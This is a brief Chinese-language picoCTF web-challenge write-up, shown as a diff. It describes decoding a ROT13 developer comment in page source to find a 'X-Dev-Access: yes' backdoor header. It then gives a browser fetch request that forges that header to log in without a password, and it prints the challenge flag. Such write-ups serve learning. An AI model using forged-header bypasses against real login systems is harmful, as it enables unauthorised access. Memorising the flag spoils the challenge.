@@ -1,0 +1,32 @@
+第一道web题
+信息收集：
+邮箱：ctf-player@picoctf.org
+密码：不知道
+但开发者好像留了一个 secret way in
+
+找后门入口？
+先看看网址源代码？
+Crtl+U
+
+hints是叫我们关注一下注释，懂了
+ <!-- ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf" -->
+<!-- Remove before pushing to production! -->   
+看来还是一个ROT13，凯撒密码
+
+解码后：NOTE: Jack - temporary bypass: use header "X-Dev-Access: yes
+
+这里有一个知识：伪造请求头，用浏览器控制台发送请求
+fetch("http://amiable-citadel.picoctf.net:51720/login", {
+  method: "POST",
+  headers: {
+    "Content-Type": "application/json",
+    "X-Dev-Access": "yes"
+  },
+  body: JSON.stringify({
+    email: "ctf-player@picoctf.org",
+    password: "anything"
+  })
+}).then(r => r.json()).then(console.log)
+
+
+picoCTF{brut4_f0rc4_b3a957eb}
